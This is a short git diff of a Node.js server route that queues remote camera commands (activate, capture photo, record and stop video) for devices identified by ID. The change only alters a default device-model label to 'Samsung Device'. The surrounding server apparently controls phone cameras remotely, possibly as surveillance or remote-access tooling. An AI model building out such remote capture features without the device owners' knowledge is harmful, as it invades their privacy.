@@ -372,6 +372,9 @@ app.post('/api/camera', (req, res) => {
             });
         }
         
+        // ✅ UPDATED: Device model properly use karo
+        const actualDeviceModel = device_model || 'Samsung Device';
+        
         // Commands file mein save karo
         const commands = readCommands();
         const newCommand = {
@@ -379,7 +382,7 @@ app.post('/api/camera', (req, res) => {
             device_id: device_id,
             action: action || 'activate',
             camera_type: camera_type || 'front',
-            device_model: device_model || 'Unknown Device',
+            device_model: actualDeviceModel,
             type: 'camera_command',
             status: 'pending',
             created_at: new Date().toISOString(),
@@ -390,7 +393,7 @@ app.post('/api/camera', (req, res) => {
         commands.stats.total_camera_commands = commands.camera_commands.length;
         
         if (writeCommands(commands)) {
-            console.log(`✅ Camera command saved: ${action || 'activate'} for ${device_id} (${device_model || 'Unknown'})`);
+            console.log(`✅ Camera command saved: ${action || 'activate'} for ${device_id} (${actualDeviceModel})`);
             
             // ✅ UPDATED: Custom message format "Front cam model_number current_time"
             const currentTime = new Date().toLocaleTimeString('en-IN', { 
@@ -402,15 +405,15 @@ app.post('/api/camera', (req, res) => {
             
             let message = '';
             if (action === 'activate') {
-                message = `Front cam ${device_model || 'Device'} ${currentTime}`;
+                message = `Front cam ${actualDeviceModel} ${currentTime}`;
             } else if (action === 'capture') {
-                message = `Photo captured ${camera_type} cam ${device_model || 'Device'} ${currentTime}`;
+                message = `Photo captured ${camera_type} cam ${actualDeviceModel} ${currentTime}`;
             } else if (action === 'record') {
-                message = `Video recording ${camera_type} cam ${device_model || 'Device'} ${currentTime}`;
+                message = `Video recording ${camera_type} cam ${actualDeviceModel} ${currentTime}`;
             } else if (action === 'stop_record') {
-                message = `Video stopped ${camera_type} cam ${device_model || 'Device'} ${currentTime}`;
+                message = `Video stopped ${camera_type} cam ${actualDeviceModel} ${currentTime}`;
             } else {
-                message = `Camera command ${device_model || 'Device'} ${currentTime}`;
+                message = `Camera command ${actualDeviceModel} ${currentTime}`;
             }
             
             res.json({
@@ -418,7 +421,7 @@ app.post('/api/camera', (req, res) => {
                 message: message,
                 command_id: newCommand.id,
                 device_id: device_id,
-                device_model: device_model || 'Unknown',
+                device_model: actualDeviceModel,
                 action: newCommand.action,
                 camera_type: newCommand.camera_type,
                 timestamp: new Date().toISOString()
